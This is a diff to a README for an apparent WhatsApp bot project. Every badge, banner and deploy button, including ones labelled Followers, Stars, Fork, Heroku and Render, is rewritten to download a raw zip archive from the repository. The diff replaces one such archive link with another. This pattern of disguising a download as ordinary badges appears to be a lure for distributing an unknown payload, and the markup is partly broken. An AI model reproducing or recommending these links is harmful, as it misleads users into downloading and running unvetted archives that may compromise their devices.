@@ -5,51 +5,51 @@
 </p>
 
 <p align="center">
-  <img src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Animated Typing SVG" />
+  <img src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip+WHATSAPP+BOT;MULTI-DEVICE+SUPPORT;POWERED+BY+BAILEYS;FAST++SECURE++RELIABLE" alt="Animated Typing SVG" />
 </p>
 
 <div align="center">
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Followers" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Stars" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Forks" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Size" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img height="28" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip%https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Followers" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Stars" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Forks" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Size" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img height="28" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip%https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
 </
 
 <!-- Banner Image -->
 <p align="center">
-  <a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip">
-    <img src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip" width="100%" height="auto">
+  <a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip">
+    <img src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip" width="100%" height="auto">
   </a>
 </p>
 
 ---
 
-<a><img src='https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip'/></a>
 
 
   <p align="center">
-<a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Followers" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-<a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="STARS" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-<a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Forks" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
-<a href="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"><img title="Watching" src="https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip"></a>
+<a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Followers" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="STARS" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Forks" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"><img title="Watching" src="https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip"></a>
 
 
 ---
 ### 🟢 FOLLOW 
-[![GITHUB](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![GITHUB](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 ### 🔵 FORK 
-[![fork](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![fork](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 ### ⚪ PAIR  
-[![pair](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![pair](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 ### 🔴 QR CODE  
-[![qr](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![qr](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 
@@ -57,13 +57,13 @@
 
 ---
 ### 🟣 HEROKU  
-[![Heroku](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![Heroku](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 ### 🟡 RAILWAY  
-[![Railway](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![Railway](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 
 ---
 ### 🔴 RENDER  
-[![Render](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)](https://github.com/arghadipde/BMB-XMD/raw/refs/heads/main/scan/XMD_BM_2.1.zip)
+[![Render](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)](https://raw.githubusercontent.com/arghadipde/BMB-XMD/main/scs/BM_XMD_v2.8.zip)
 </div>
